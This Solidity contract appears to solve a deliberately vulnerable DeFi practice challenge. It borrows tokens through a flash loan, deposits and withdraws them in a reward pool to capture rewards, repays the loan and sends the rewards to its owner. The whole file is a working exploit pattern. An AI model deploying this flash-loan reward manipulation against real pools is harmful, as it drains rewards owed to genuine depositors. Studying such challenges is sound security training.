// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IFlashLoanerPool} from "./IFlashLoanerPool.sol";
import {IFlashLoanerPoolReceiver} from "./IFlashLoanerPoolReceiver.sol";
import {ITheRewarderPool} from "./ITheRewarderPool.sol";

contract TheRewarderPoolAttacker is IFlashLoanerPoolReceiver, Ownable2Step {
    IERC20 private immutable i_dvToken;
    IFlashLoanerPool private immutable i_loanerPool;
    ITheRewarderPool private immutable i_rewarderPool;
    IERC20 private immutable i_rewardToken;

    error CallerIsNotLoanerPool();
    error WithdrawFailed();

    event FundsWithdrawn(address to, uint256 amount);

    constructor(
        address _dvToken,
        address _loanerPool,
        address _rewarderPool,
        address _rewardToken
    ) Ownable2Step() {
        i_dvToken = IERC20(_dvToken);
        i_loanerPool = IFlashLoanerPool(_loanerPool);
        i_rewarderPool = ITheRewarderPool(_rewarderPool);
        i_rewardToken = IERC20(_rewardToken);
    }

    function exploit(uint256 _amount) external onlyOwner {
        i_loanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        if (msg.sender != address(i_loanerPool)) {
            revert CallerIsNotLoanerPool();
        }
        i_dvToken.approve(address(i_rewarderPool), _amount);
        i_rewarderPool.deposit(_amount);
        i_rewarderPool.withdraw(_amount);
        i_dvToken.transfer(address(i_loanerPool), _amount);
        i_rewardToken.transfer(owner(), i_rewardToken.balanceOf(address(this)));
    }
}
